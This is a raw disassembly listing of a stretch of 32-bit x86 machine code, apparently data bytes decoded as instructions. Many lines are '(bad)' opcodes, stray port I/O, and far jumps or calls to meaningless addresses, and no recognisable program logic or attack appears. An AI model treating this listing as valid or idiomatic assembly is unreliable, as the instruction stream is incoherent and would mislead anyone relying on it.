  411a6f:	fidivr WORD PTR [ebx-0x47470713]
  411a75:	add    edi,ecx
  411a77:	add    ah,ch
  411a79:	retf   
  411a7a:	aad    0xe9
  411a7c:	jmp    0x411a5b
  411a7e:	paddd  mm7,mm1
  411a81:	enter  0xc2ca,0xcf
  411a85:	shr    dl,0xc7
  411a88:	hlt    
  411a89:	(bad)
  411a8c:	in     al,0xe5
  411a8e:	in     eax,dx
  411a8f:	in     eax,dx
  411a90:	fcmovnu st,st(5)
  411a92:	fsub   st(5),st
  411a94:	int3   
  411a95:	out    0xf4,al
  411a97:	add    eax,DWORD PTR [edx]
  411a99:	add    al,0x1
  411a9b:	(bad)
  411a9e:	jecxz  0x411a84
  411aa0:	or     ah,al
  411aa2:	in     al,dx
  411aa3:	retf   0xc8a4
  411aa6:	rcl    dh,1
  411aa8:	shr    edi,0xf3
  411aab:	(bad)
  411aae:	retf   
  411aaf:	jmp    0xc0fe:0xfcf4e0fc
  411ab6:	mov    esi,0xcb000bf1
  411abb:	fld    QWORD PTR [eax+ebp*8]
  411abe:	into   
  411abf:	repz loop 0x411a9b
  411ac2:	mov    esp,0xf5e3d3d7
  411ac7:	cli    
  411ac8:	stc    
  411ac9:	iret   
  411aca:	retf   
  411acb:	repz xlat BYTE PTR ds:[ebx]
  411acd:	mov    edx,0xb7ccdbe3
  411ad2:	xlat   BYTE PTR ds:[ebx]
  411ad3:	mov    edi,0xf6ddf4f2
  411ad8:	not    ebp
  411ada:	out    0xa,eax
  411adc:	pop    es
  411add:	in     al,dx
  411ade:	fild   WORD PTR [ecx+ecx*1]
  411ae1:	jmp    0xb4c8:0xefc7e6c6
  411ae8:	shl    DWORD PTR [esi-0x3b3b4538],0xea
  411aef:	retf   
  411af0:	out    dx,eax
  411af1:	ret    
  411af2:	(bad)  
  411af4:	fadd   st(3),st
  411af6:	add    ebp,edi
  411af8:	clc    
  411af9:	clc    
  411afa:	loope  0x411ac1
  411afc:	hlt    
  411afd:	cli    
  411afe:	or     esp,ebp
  411b00:	int    0xea
  411b02:	jmp    0xf0a9:0xe8eaeedd
  411b09:	loopne 0x411ade
  411b0b:	rcr    bh,cl
  411b0d:	imul   dh
  411b0f:	in     eax,dx
  411b10:	hlt    
  411b11:	call   0xdd280cf7
  411b16:	out    0xc0,eax
  411b18:	hlt    
  411b19:	imul   edx
  411b1b:	(bad)  
  411b1d:	in     eax,0xfb
  411b1f:	jecxz  0x411aed
  411b21:	lods   al,BYTE PTR ds:[esi]
  411b22:	repnz mov bl,0xd6
  411b25:	mov    ebp,0xe4c4e6b2
  411b2a:	loopne 0x411b17
  411b2c:	aam    0xb9
  411b2e:	icebp  
  411b2f:	lock mov al,0xd9
  411b32:	fst    st(7)
  411b34:	idiv   al
  411b36:	add    ch,bl
  411b38:	std    
  411b39:	add    ecx,DWORD PTR [ebx]
  411b3b:	iret   
  411b3c:	aam    0xdd
  411b3e:	retf   
  411b3f:	out    dx,al
  411b40:	fidiv  WORD PTR [edx-0x2c233e22]
  411b46:	leave  
  411b47:	in     al,0xed
  411b49:	aad    0xba
  411b4b:	int3   
  411b4c:	(bad)  
  411b4d:	dec    esi
  411b4f:	in     eax,dx
  411b50:	call   0xe7480d2f
  411b55:	add    ecx,eax
  411b57:	fsubr  st,st(3)
  411b59:	pop    es
  411b5a:	jmp    0x411b35
  411b5c:	aam    0xc8
  411b5e:	std    
  411b5f:	or     al,0xcd
  411b61:	icebp  
  411b62:	ret    0xceeb
  411b65:	repz in al,0xce
  411b68:	shl    edx,1
  411b6a:	jmp    0xe2f2:0xfbdbf7ff
  411b71:	xlat   BYTE PTR ds:[ebx]
  411b72:	jecxz  0x411b55
  411b74:	mov    esi,0xf0e1ebbc
  411b79:	sar    bh,0xea
  411b7c:	mov    esp,0xdd0dfbd9
  411b81:	in     eax,dx
  411b82:	in     al,0xd2
  411b84:	(bad)  
  411b85:	in     eax,dx
  411b86:	mov    dl,0xd1
  411b88:	ror    esp,cl
  411b8a:	stc    
  411b8b:	mov    al,0xcc
  411b8d:	fucomp st(7)
  411b8f:	aad    0xf1
  411b91:	call   esp
  411b93:	stc    
  411b94:	(bad)  
  411b95:	cmc    
  411b96:	out    0xe6,eax
  411b98:	cld    
  411b99:	add    edi,edx
  411b9b:	or     ch,dl
  411b9d:	or     edi,esi
  411b9f:	push   cs
  411ba0:	or     al,0xac
  411ba2:	loope  0x411b52
  411ba4:	(bad)  
  411ba5:	in     al,0xeb
  411ba7:	leave  
  411ba8:	shr    ah,1
  411baa:	(bad)  
  411bab:	sti    
  411bac:	(bad)  
  411bae:	cld    
  411baf:	retf   0x3c2
  411bb2:	iret   
  411bb3:	ror    dh,cl
  411bb5:	mul    esp
  411bb7:	out    0xc4,eax
  411bb9:	(bad)  
  411bba:	jmp    0xf3526c8
  411bbf:	loope  0x411bce
  411bc1:	retf   0xcfd1
  411bc4:	scas   eax,DWORD PTR es:[edi]
  411bc5:	out    dx,al
  411bc6:	rol    ah,0xf1
  411bc9:	(bad)  
  411bca:	sti    
  411bcb:	shr    edi,cl
  411bcd:	std    
  411bce:	xlat   BYTE PTR ds:[ebx]
  411bcf:	into   
  411bd0:	mov    edi,0x5e6c3e3
  411bd5:	cmc    
  411bd6:	out    0xc4,eax
  411bd8:	fmul   DWORD PTR [ecx]
  411bda:	shl    ch,0x7
  411bdd:	or     ebx,ecx
  411bdf:	jmp    0xa913cdcc
  411be4:	shl    DWORD PTR [ecx-0x504c2511],cl
  411bea:	retf   
  411beb:	(bad)  
  411bec:	into   
  411bed:	fstp   st(2)
  411bef:	(bad)  
  411bf0:	fld1   
  411bf2:	repz mov ecx,0xe5ebfdc3
  411bf8:	(bad)  
  411bf9:	(bad)  
  411bfb:	push   es
  411bfc:	loop   0x411c0b
  411bfe:	or     dl,BYTE PTR [ebx]
  411c00:	adc    DWORD PTR [edx-0x2e140c1a],ebp
  411c06:	repnz sar cl,1
  411c09:	shl    DWORD PTR [esi+ebp*8-0xc272b35],1
  411c10:	mov    ecx,0xded1fe
  411c15:	mov    esp,0xe80404f5
  411c1a:	loope  0x411bd9
  411c1c:	add    ebx,ebp
  411c1e:	jmp    edx
  411c20:	or     al,0xb1
  411c22:	mov    eax,0xd1c6b3d3
  411c27:	(bad)  
  411c28:	(bad)  [eax+ebp*8-0x322a0a32]
  411c2f:	ror    esi,cl
  411c31:	sti    
  411c32:	aam    0xc7
  411c34:	out    dx,al
  411c35:	(bad)  
  411c36:	fsubrp st(1),st
  411c38:	rol    al,1
  411c3a:	fst    st(5)
  411c3c:	add    eax,0xe9eec2e6
  411c41:	rcr    bh,cl
  411c43:	vshufps ymm2,ymm2,ymm7,0xc0
  411c48:	into   
  411c49:	(bad)  
  411c4a:	out    0xd5,al
  411c4c:	(bad)  
  411c4d:	sar    edx,1
  411c4f:	out    dx,eax
  411c50:	add    cl,bh
  411c52:	mov    eax,0xf5ddddc7
  411c57:	or     ah,dh
  411c59:	call   0xda3f2741
  411c5e:	add    ah,bh
  411c60:	std    
  411c61:	jmp    0xc31dd917
  411c66:	rcl    dh,0xc1
  411c69:	out    0xf0,al
  411c6b:	shr    esi,1
  411c6d:	(bad)
  411c70:	icebp  
  411c71:	in     al,dx
  411c72:	ret    0xf6db
  411c75:	cmc    
  411c76:	aad    0xff
  411c78:	out    0xdd,al
  411c7a:	hlt    
  411c7b:	cld    
  411c7c:	(bad)  
  411c7e:	jmp    0x411c4d
  411c80:	out    dx,eax
  411c81:	(bad)  
  411c83:	in     eax,0xac
  411c85:	(bad)  
  411c86:	repnz icebp 
  411c88:	xlat   BYTE PTR ds:[ebx]
  411c89:	mov    edx,0xf1ddf0cd
  411c8e:	cld    
  411c8f:	sti    
  411c90:	loop   0x411c95
  411c92:	loopne 0x411c8a
  411c94:	fcomip st,st(0)
  411c96:	add    eax,0x1c3d9f3
  411c9b:	std    
  411c9c:	cld    
  411c9d:	add    dl,BYTE PTR [ebx]
  411c9f:	enter  0xc40c,0xc0
  411ca3:	retf   0xafc1
  411ca6:	mul    edi
  411ca8:	call   0xdb27145c
  411cad:	cli    
  411cae:	into   
  411caf:	clc    
  411cb0:	cli    
  411cb1:	std    
  411cb2:	fild   DWORD PTR [ecx]
  411cb4:	cli    
  411cb5:	fsub   st,st(3)
  411cb7:	fcmovu st,st(1)
  411cb9:	push   es
  411cba:	hlt    
  411cbb:	enter  0xfaff,0xf
  411cbf:	or     ch,dl
  411cc1:	(bad)  
  411cc2:	xlat   BYTE PTR ds:[ebx]
  411cc3:	mul    edi
  411cc5:	rcl    cl,1
  411cc7:	into   
  411cc8:	enter  0xc5e4,0xf3
  411ccc:	std    
  411ccd:	clc    
  411cce:	stc    
  411ccf:	leave  
  411cd0:	iret   
  411cd1:	fdiv   st,st(6)
  411cd3:	mov    eax,0xdcecf4df
  411cd8:	fild   WORD PTR [ebx]
  411cda:	(bad)  
  411cdb:	leave  
  411cdc:	add    eax,0xcce4cb02
  411ce1:	test   al,0xdc
  411ce3:	(bad)  
  411ce4:	int    0xbd
  411ce6:	out    0xeb,eax
  411ce8:	repnz jmp 0xf9f6:0xb4b0fef0
  411cf0:	int    0xff
  411cf2:	mov    edx,0xdfdfd6fc
  411cf7:	shl    dl,0xd5
  411cfa:	jmp    0xe422e7d9
  411cff:	or     eax,0xc1cfabcd
  411d04:	mov    ebp,0xe6c7ebf4
  411d09:	mov    ah,0xfa
  411d0b:	stc    
  411d0c:	repz aam 0xd6
  411d0f:	cld    
  411d10:	hlt    
  411d11:	fstp   st(3)
  411d13:	jecxz  0x411cd2
  411d15:	rcl    eax,1
  411d17:	(bad)  
  411d19:	jmp    0xea231604
  411d1e:	loopne 0x411d24
  411d20:	repz int 0xc1
  411d23:	jmp    0x411cdb
  411d25:	repnz enter 0xcfb2,0xf7
  411d2a:	out    0xb9,eax
  411d2c:	in     eax,0xb8
  411d2e:	div    esp
  411d30:	jmp    0xc0f9:0xf5c2f4ce
  411d37:	or     esp,eax
  411d39:	(bad)  
  411d3b:	call   0x339e426
  411d40:	int3   
  411d41:	leave  
  411d42:	loope  0x411d35
  411d44:	repz loop 0x411d1b
  411d47:	jmp    0x411d37
  411d49:	out    0xe7,al
  411d4b:	lock mov ch,0xce
  411d4e:	mov    dl,0xde
  411d50:	out    dx,eax
  411d51:	mov    esp,0xc1eed401
  411d56:	idiv   BYTE PTR [ecx+0x9e5cae0]
  411d5c:	(bad)  
  411d5d:	cmc    
  411d5e:	hlt    
  411d5f:	int3   
  411d60:	into   
  411d61:	jmp    0xd5c9:0xdcc6e2f0
  411d68:	shr    esi,1
  411d6a:	(bad)  
  411d6c:	mov    al,0xf0
  411d6e:	into   
  411d6f:	jecxz  0x411d40
  411d71:	lock sar BYTE PTR [ebp-0x3c2a4407],0xd9
  411d79:	pop    es
  411d7a:	clc    
  411d7b:	or     BYTE PTR ds:0xdfe206db,al
  411d81:	(bad)  
  411d82:	call   0xe518da64
  411d87:	sti    
  411d88:	fcomi  st,st(3)
  411d8a:	out    0xe4,al
  411d8c:	mov    ah,0xba
  411d8e:	xlat   BYTE PTR ds:[ebx]
  411d8f:	fldlg2 
  411d91:	in     eax,dx
  411d92:	cld    
  411d93:	shl    ecx,1
  411d95:	xlat   BYTE PTR ds:[ebx]
  411d96:	loop   0x411d9e
  411d98:	add    eax,0xceca05c2
  411d9d:	sti    
  411d9e:	out    dx,eax
  411d9f:	int    0xdf
  411da1:	loop   0x411d61
  411da3:	test   al,0xf5
  411da5:	mov    ebp,0xf4c1e3f5
  411daa:	mov    dh,0xf9
  411dac:	enter  0xd8d5,0xf3
  411db0:	sar    esi,1
  411db2:	call   0xc33be18e
  411db7:	stc    
  411db8:	xlat   BYTE PTR ds:[ebx]
  411db9:	stc    
  411dba:	hlt    
  411dbb:	jecxz  0x411da0
  411dbd:	in     al,0xec
  411dbf:	loop   0x411d8c
  411dc1:	in     eax,dx
  411dc2:	out    dx,eax
  411dc3:	test   ecx,0xf1e5cdee
  411dc9:	out    dx,al
  411dca:	in     al,0xd0
  411dcc:	lock stc 
  411dce:	mov    ebp,0xfbd9d2e3
  411dd3:	loopne 0x411dcd
  411dd5:	shl    ecx,1
  411dd7:	clc    
  411dd8:	fst    st(6)
  411dda:	pop    es
  411ddb:	add    al,0xe0
  411ddd:	verr   sp
  411de0:	stc    
  411de1:	retf   
  411de2:	into   
  411de3:	shl    ebx,1
  411de5:	out    0xd4,eax
  411de7:	mov    al,0xf5
  411de9:	scas   eax,DWORD PTR es:[edi]
  411dea:	out    dx,al
  411deb:	call   0xc4140da5
  411df0:	(bad)  
  411df2:	into   
  411df3:	aam    0xdc
  411df5:	(bad)  
  411df6:	out    0xdf,al
  411df8:	jmp    0xe6e6:0xdd5cac0
  411dff:	leave  
  411e00:	in     eax,0xd9
  411e02:	retf   
  411e03:	(bad)
  411e06:	lods   al,BYTE PTR ds:[esi]
  411e07:	shl    eax,1
  411e09:	stc    
  411e0a:	mov    edx,0xe3b7faf8
  411e0f:	call   0xd118e6e7
  411e14:	std    
  411e15:	shl    edx,cl
  411e17:	retf   
  411e18:	rcr    al,0xe1
  411e1b:	inc    dh
  411e1d:	loop   0x411dfe
  411e1f:	fdiv   st(5),st
  411e21:	repz lock in eax,0xea
  411e25:	div    ecx
  411e27:	(bad)  
  411e28:	mov    bh,0xc5
  411e2a:	scas   al,BYTE PTR es:[edi]
  411e2b:	in     al,0xb7
  411e2d:	in     al,dx
  411e2e:	cmc    
  411e2f:	aam    0xc9
  411e31:	aam    0xdd
  411e33:	(bad)  
  411e35:	loopne 0x411e1b
  411e37:	test   DWORD PTR [esi],0xc8fcdc
  411e3d:	loopne 0x411e20
  411e3f:	or     al,0xec
  411e41:	loopne 0x411e0f
  411e43:	mov    bl,0xdd
  411e45:	ret    
  411e46:	(bad)
  411e49:	aam    0xd3
  411e4b:	mov    edi,0xd0f2ecd4
  411e50:	add    ecx,esp
  411e52:	repnz cmc 
  411e54:	add    bh,cl
  411e56:	loope  0x411e50
  411e58:	aad    0xea
  411e5a:	in     eax,0xc1
  411e5c:	cld    
  411e5d:	add    esi,esp
  411e5f:	(bad)  
  411e61:	rep lods eax,DWORD PTR ds:[esi]
  411e63:	loop   0x411e5a
  411e65:	lock aad 0xe0
  411e68:	mov    dl,0xe6
  411e6a:	cli    
  411e6b:	in     eax,0xeb
  411e6d:	mov    esi,0xf5edfeca
  411e72:	int3   
  411e73:	mov    ebp,0xc7f5fdfb
  411e78:	(bad)  
  411e7a:	mov    DWORD PTR [esi],0xbfac600
  411e80:	or     esi,ebx
  411e82:	rcl    cl,cl
  411e84:	leave  
  411e85:	loopne 0x411e6c
  411e87:	mov    dh,0xc0
  411e89:	leave  
  411e8a:	enter  0xf5e4,0xba
  411e8e:	mov    ah,0xca
  411e90:	aam    0xf7
  411e92:	shr    ch,0xfd
  411e95:	in     al,dx
  411e96:	loop   0x411e9a
  411e98:	ret    0xfbcb
  411e9b:	add    bh,bl
  411e9d:	into   
  411e9e:	bswap  ebx
  411ea0:	int3   
  411ea1:	loope  0x411e84
  411ea3:	out    dx,eax
  411ea4:	mov    dh,0xc8
  411ea6:	(bad)  
  411ea7:	aad    0xd5
  411ea9:	out    0xf2,al
  411eab:	out    dx,al
  411eac:	fyl2xp1 
  411eae:	mov    ebx,0xddeceaf3
  411eb3:	add    dh,dl
  411eb5:	(bad)  
  411eb6:	aam    0xd0
  411eb8:	fcmovb st,st(3)
  411eba:	std    
  411ebb:	out    0xe5,eax
  411ebd:	(bad)  
  411ebe:	fcomip st,st(3)
  411ec0:	out    dx,eax
  411ec1:	enter  0xdca6,0xdc
  411ec5:	fst    st(4)
  411ec7:	mov    bl,0xcf
  411ec9:	loopne 0x411e94
  411ecb:	leave  
  411ecc:	fsubr  st,st(7)
  411ece:	mov    ebx,0xdbf3f9df
  411ed3:	cmc    
  411ed4:	mov    edi,0xbcc5da03
  411ed9:	leave  
  411eda:	lock inc DWORD PTR ds:0xc8ec0c0c
  411ee1:	mov    dl,0xea
  411ee3:	mov    esp,0xacf5c3f1
  411ee8:	stc    
  411ee9:	loopne 0x411ec6
  411eeb:	mov    edx,0xbfbffae5
  411ef0:	jmp    0xed2e1ff8
  411ef5:	loope  0x411eec
  411ef7:	(bad)  
  411ef9:	aam    0xca
  411efb:	iret   
  411efc:	sti    
  411efd:	add    eax,0xcd0ffcde
  411f02:	scas   al,BYTE PTR es:[edi]
  411f03:	int3   
  411f04:	retf   
  411f05:	scas   al,BYTE PTR es:[edi]
  411f06:	retf   0xb0d5
  411f09:	lock (bad) 
  411f0c:	retf   
  411f0d:	fsub   st(3),st
  411f0f:	jmp    0x73dfef5
  411f14:	lock rol DWORD PTR [ebx*8-0x23fb2221],cl
  411f1c:	cli    
  411f1d:	stc    
  411f1e:	std    
  411f1f:	(bad)  
  411f21:	mov    ecx,0xf3e6dcc9
  411f26:	loop   0x411f08
  411f28:	shl    eax,1
  411f2a:	in     eax,dx
  411f2b:	fld    TBYTE PTR [edx+edx*8-0x1e471c36]
  411f32:	int    0xe7
  411f34:	(bad)  
  411f36:	shl    esp,1
  411f38:	lock (bad) 
  411f3a:	or     cl,BYTE PTR [ecx]
  411f3c:	in     eax,dx
  411f3d:	aad    0xfc
  411f3f:	out    0xde,eax
  411f41:	mov    eax,0xb3a4deeb
  411f46:	cmc    
  411f47:	ret    
  411f48:	mov    dl,0xc9
  411f4a:	leave  
  411f4b:	cmc    
  411f4c:	fdivr  DWORD PTR [ecx-0x28114b38]
  411f52:	add    esi,esi
  411f54:	sar    DWORD PTR [ecx+eiz*8+0x4d8c3e0],1
  411f5b:	fadd   QWORD PTR [edi]
  411f5d:	in     eax,dx
  411f5e:	or     edi,ebx
  411f60:	adc    ebx,edx
  411f62:	mov    cl,0xb2
  411f64:	out    0xed,al
  411f66:	mov    ch,0xd6
  411f68:	aam    0xf6
  411f6a:	stc    
  411f6b:	out    dx,al
  411f6c:	hlt    
  411f6d:	std    
  411f6e:	(bad)  
  411f70:	leave  
  411f71:	int3   
  411f72:	stc    
  411f73:	shl    ebx,0xe1
  411f76:	sar    edi,1
  411f78:	add    al,0xd9
  411f7a:	cld    
  411f7b:	out    0xe2,al
  411f7d:	std    
  411f7e:	loopne 0x411f81
  411f80:	int3   
  411f81:	fcomip st,st(0)
  411f83:	mov    al,0xcb
  411f85:	mov    al,0xc8
  411f87:	jmp    0x411f6d
  411f89:	loopne 0x411f61
  411f8b:	call   0xfef81047
  411f90:	in     eax,dx
  411f91:	add    al,ah
  411f93:	(bad)  
  411f95:	clc    
  411f96:	clc    
  411f97:	hlt    
  411f98:	icebp  
  411f99:	out    0xc9,al
  411f9b:	xlat   BYTE PTR ds:[ebx]
  411f9c:	stc    
  411f9d:	(bad)  
  411f9e:	(bad)  
  411fa0:	add    ah,dh
  411fa2:	test   esp,0xb1d1c6be
  411fa8:	icebp  
  411fa9:	lock mov al,0xd1
  411fac:	mov    ecx,0xefc8dfea
  411fb1:	std    
  411fb2:	int    0xef
  411fb4:	sti    
  411fb5:	div    ebx
  411fb7:	xlat   BYTE PTR ds:[ebx]
  411fb8:	test   DWORD PTR [eax],0xed0ed7f5
  411fbe:	int    0xfc
  411fc0:	push   es
  411fc1:	retf   
  411fc2:	in     al,0xec
  411fc4:	in     eax,dx
  411fc5:	ffree  st(7)
  411fc7:	imul   ebx
  411fc9:	leave  
  411fca:	(bad)  
  411fcb:	out    0xcd,al
  411fcd:	(bad)  
  411fcf:	out    dx,al
  411fd0:	(bad)  
  411fd2:	sar    al,cl
  411fd4:	fiadd  WORD PTR [edi]
  411fd6:	stc    
  411fd7:	lds    eax,FWORD PTR [edx]
  411fd9:	aad    0xc9
  411fdb:	out    0xe1,eax
  411fdd:	in     eax,0xe8
  411fdf:	add    esi,esp
  411fe1:	faddp  st(1),st
  411fe3:	neg    ch
  411fe5:	test   ebp,0xb9cad3b4
  411feb:	(bad)  
  411fee:	std    
  411fef:	retf   0xf0f9
  411ff2:	mov    eax,0xc2c2eeee
  411ff7:	jecxz  0x411ffa
  411ff9:	stc    
  411ffa:	fisttp QWORD PTR [edi]
  411ffc:	dec    DWORD PTR [ecx]
  411ffe:	sti    
  411fff:	jmp    0xe6d7:0xe8e6e20f
  412006:	(bad)  
  412007:	cli    
  412008:	stc    
  412009:	enter  0xb4e4,0xb9
  41200d:	hlt    
  41200e:	out    dx,al
  41200f:	loop   0x412012
  412011:	in     al,dx
  412012:	aad    0xfd
  412014:	int3   
  412015:	faddp  st(2),st
  412017:	repz retf 
  412019:	add    eax,0xdb00f6fa
  41201e:	into   
  41201f:	in     eax,dx
  412020:	loop   0x411ff3
  412022:	mov    al,0xef
  412024:	shr    bh,0xdb
  412027:	out    dx,al
  412028:	fchs   
  41202a:	out    dx,eax
  41202b:	mov    bh,0xd9
  41202d:	retf   
  41202e:	fdiv   st(3),st
  412030:	cld    
  412031:	fdivr  st(7),st
  412033:	mov    esi,0xdfc4d6f3
  412038:	add    al,0xc9
  41203a:	mul    esp
  41203c:	add    ebp,eax
  41203e:	retf   0xccff
  412041:	in     eax,0xb8
  412043:	jmp    0xf9d7:0xc2cdcee6
  41204a:	(bad)  
  41204b:	neg    ecx
  41204d:	dec    ebp
  41204f:	fcmovne st,st(0)
  412051:	(bad)  
  412053:	cld    
  412054:	out    0x1,eax
  412056:	out    0xfa,al
  412058:	stc    
  412059:	or     dl,cl
  41205b:	aam    0xe3
  41205d:	hlt    
  41205e:	fxch   st(2)
  412060:	jmp    0xf3ad:0xd2dde6ab
  412067:	mov    dh,0xb2
  412069:	mov    ch,0xea
  41206b:	mov    ch,0xbb
  41206d:	mov    esi,0xd5e8cbd3
  412072:	jecxz  0x412043
  412074:	jecxz  0x41203d
  412076:	jmp    0x412083
  412078:	in     al,0xd1
  41207a:	xlat   BYTE PTR ds:[ebx]
  41207b:	retf   0xfee7
  41207e:	(bad)  
  41207f:	out    dx,eax
  412080:	ror    ah,cl
  412082:	scas   al,BYTE PTR es:[edi]
  412083:	scas   al,BYTE PTR es:[edi]
  412084:	mov    bl,0xec
  412086:	rcl    dh,1
  412088:	leave  
  412089:	repz rol dh,0xac
  41208d:	mov    esi,0xf0c3fde9
  412092:	xlat   BYTE PTR ds:[ebx]
  412093:	aam    0xdc
  412095:	rol    DWORD PTR [ebx],cl
  412097:	(bad)  
  412099:	cli    
  41209a:	add    esp,edi
  41209c:	or     BYTE PTR ds:0xd9ffec0b,al
  4120a2:	loop   0x412072
  4120a4:	imul   BYTE PTR [eax+eiz*8-0xf2e3a]
  4120ab:	test   ebp,0xceb1dcb6
  4120b1:	aam    0xe2
  4120b3:	mov    eax,0xa03e2f1
  4120b8:	fld    QWORD PTR [edi+ebx*8]
  4120bb:	out    dx,eax
  4120bc:	add    eax,0xec9cc0f
  4120c1:	in     eax,0xd2
  4120c3:	loopne 0x412088
  4120c5:	jecxz  0x4120ba
  4120c7:	rcl    edi,0xcd
  4120ca:	iret   
  4120cb:	fcmovnu st,st(3)
  4120cd:	shr    ch,1
  4120cf:	lock mov ebp,0xbdd8d0ee
  4120d5:	sti    
  4120d6:	loopne 0x4120cd
  4120d8:	add    al,0xe1
  4120da:	or     al,cl
  4120dc:	(bad)  
  4120dd:	stc    
  4120de:	fsub   st,st(2)
  4120e0:	rol    edx,cl
  4120e2:	fmul   st,st(0)
  4120e4:	mov    bh,0xc5
  4120e6:	ror    ah,1
  4120e8:	loopne 0x4120c4
  4120ea:	enter  0xdbb1,0xba
  4120ee:	(bad)  
  4120f0:	(bad)  
  4120f2:	mov    dh,0xdc
  4120f4:	loop   0x4120c6
  4120f6:	cmc    
  4120f7:	stc    
  4120f8:	add    edi,ebx
  4120fa:	or     bh,cl
  4120fc:	jmp    0xd3350ae9
  412101:	(bad)  
  412103:	int3   
  412104:	mov    dl,0xe7
  412106:	ret    0xcbda
  412109:	clc    
  41210a:	ror    dl,0xea
  41210d:	hlt    
  41210e:	cmc    
  41210f:	cmc    
  412110:	jmp    0xf4d6:0xfcd8c0de
  412117:	shl    al,cl
  412119:	mov    cl,0xc0
  41211c:	out    0xdc,eax
  41211e:	add    cl,ch
  412120:	or     eax,edx
  412122:	ror    ebp,0xe2
  412125:	mov    esp,0xedd0d4c9
  41212a:	sti    
  41212b:	aam    0xbf
  41212d:	dec    esp
  41212f:	std    
  412130:	into   
  412131:	mov    esp,0xf4e3d2e1
  412136:	add    bl,dl
  412138:	test   dl,0xf8
  41213b:	out    0xf8,al
  41213d:	(bad)  
  41213e:	cli    
  41213f:	cld    
  412140:	clc    
  412141:	out    0xbe,eax
  412143:	scas   al,BYTE PTR es:[edi]
  412144:	int    0xb1
  412146:	in     al,dx
  412147:	(bad)  
  412148:	iret   
  412149:	mov    ah,0xd6
  41214b:	f2xm1  
  41214d:	in     al,0xf5
  41214f:	int3   
  412150:	cmc    
  412151:	icebp  
  412152:	(bad)  
  412154:	in     eax,0xd9
  412156:	mov    esi,0x7f5b8fc
  41215b:	cli    
  41215c:	into   
  41215d:	hlt    
  41215e:	(bad)  
  412160:	loope  0x41211f
  412162:	retf   
  412163:	shr    dh,1
  412165:	retf   
  412166:	out    dx,eax
  412167:	(bad)  
  412168:	icebp  
  412169:	out    dx,eax
  41216a:	hlt    
  41216b:	in     al,dx
  41216c:	mov    ch,0xfe
  41216e:	(bad)  
  41216f:	cld    
  412170:	fstp   TBYTE PTR [eax-0x2d212b22]
  412176:	aad    0xdd
  412178:	add    al,0xea
  41217a:	(bad)  
  41217b:	inc    DWORD PTR [esp+ecx*1]
  41217e:	or     ecx,ecx
  412180:	loop   0x41212c
  412182:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412183:	mov    ebp,0xf5ede7f6
  412188:	loope  0x412181
  41218a:	mov    edx,0xb4f5fbeb
  41218f:	cli    
  412190:	into   
  412191:	fistp  QWORD PTR [eax+edi*8+0xbf5beb4]
  412198:	shr    eax,1
  41219a:	loopne 0x412194
  41219c:	jmp    0xcc4efa6b
  4121a1:	int    0xaf
  4121a3:	scas   eax,DWORD PTR es:[edi]
  4121a4:	ret    
  4121a5:	(bad)  
  4121a6:	aad    0xad
  4121a8:	in     al,0xb6
  4121aa:	out    dx,al
  4121ab:	out    0xd2,eax
  4121ad:	enter  0xfae4,0xd5
  4121b1:	std    
  4121b2:	cld    
  4121b3:	mov    ecx,0xf3ff06c7
  4121b8:	in     al,0xd7
  4121ba:	cld    
  4121bb:	cmc    
  4121bc:	add    esi,ebp
  4121be:	mov    BYTE PTR [esi],0xdd
  4121c1:	mov    esi,0xf4c9f6d0
  4121c6:	mov    ch,0xa9
  4121c8:	sti    
  4121c9:	iret   
  4121ca:	(bad)  
  4121cb:	in     al,0xc6
  4121cd:	mov    bh,0xf4
  4121cf:	mov    esi,0xe7fddff9
  4121d4:	out    dx,al
  4121d5:	in     al,dx
  4121d6:	(bad)  
  4121d8:	in     eax,0xd5
  4121da:	dec    BYTE PTR [ebx]
  4121dc:	retf   0xc8df
  4121df:	fiadd  DWORD PTR [ebx]
  4121e1:	scas   al,BYTE PTR es:[edi]
  4121e2:	mov    esp,0xe1e6e7f6
  4121e7:	jmp    0xede4:0xadf6dacf
  4121ee:	(bad)  
  4121ef:	mov    edi,0xe2dce9cd
  4121f4:	hlt    
  4121f5:	clc    
  4121f6:	fldpi  
  4121f8:	out    0xe4,al
  4121fa:	loopne 0x4121d4
  4121fc:	clc    
  4121fd:	sti    
  4121fe:	fcmovnu st,st(7)
  412200:	add    al,al
  412202:	repz (bad) 
  412205:	jmp    0x4121b5
  412207:	(bad)  [eax+eax*8-0x312263a]
  41220e:	mov    ecx,0xf400f9ce
  412213:	xlat   BYTE PTR ds:[ebx]
  412214:	ffree  st(2)
  412216:	push   es
  412217:	add    ebp,edx
  412219:	add    ch,ah
  41221b:	jecxz  0x41221e
  41221d:	(bad)  
  41221e:	adc    ecx,DWORD PTR [esi]
  412220:	or     edi,esp
  412222:	ret    
  412223:	ffree  st(6)
  412225:	in     al,dx
  412226:	enter  0xd4d5,0xc5
  41222a:	shr    ah,cl
  41222c:	in     al,dx
  41222d:	jmp    0xd7b8:0xd6e3ccd6
  412234:	int3   
  412235:	(bad)  
  412237:	(bad)  
  412239:	leave  
  41223a:	out    dx,eax
  41223b:	loope  0x412238
  41223d:	dec    BYTE PTR [edi]
  41223f:	(bad)  
  412241:	loop   0x412203
  412243:	in     eax,0xcf
  412245:	scas   eax,DWORD PTR es:[edi]
  412246:	mov    ah,0xe0
  412248:	into   
  412249:	imul   ch
  41224b:	out    0xec,eax
  41224d:	stc    
  41224e:	mov    edx,0xb9d2f8d5
  412253:	clc    
  412254:	neg    bl
  412256:	stc    
  412257:	aad    0xd8
  412259:	jecxz  0x41225b
  41225b:	out    0xfa,al
  41225d:	add    eax,0xaa11e805
  412262:	rcl    esi,cl
  412264:	mov    esp,0xd3e6b3f6
  412269:	shl    ebx,0xf0
  41226c:	leave  
  41226d:	fcmovnbe st,st(5)
  41226f:	in     eax,dx
  412270:	(bad)  
  412272:	mov    dh,0xc1
  412274:	(bad)  
  412275:	xlat   BYTE PTR ds:[ebx]
  412276:	jmp    0x412234
  412278:	add    dl,bl
  41227a:	push   es
  41227b:	fxch   st(1)
  41227d:	std    
  41227e:	ret    0xe8e7
  412281:	test   eax,0xe3e9c3bd
  412286:	out    dx,al
  412287:	mov    dl,0xf4
  412289:	retf   
  41228a:	mov    ah,0xe6
  41228c:	enter  0xffcc,0xf4
  412290:	icebp  
  412291:	add    ch,bl
  412293:	icebp  
  412294:	mov    eax,0xc2ff02df
  412299:	mov    edi,0xc3f9c1e5
  41229e:	(bad)  
  41229f:	inc    BYTE PTR [edi]
  4122a1:	out    dx,eax
  4122a2:	jecxz  0x412269
  4122a4:	retf   
  4122a5:	mov    dh,0xee
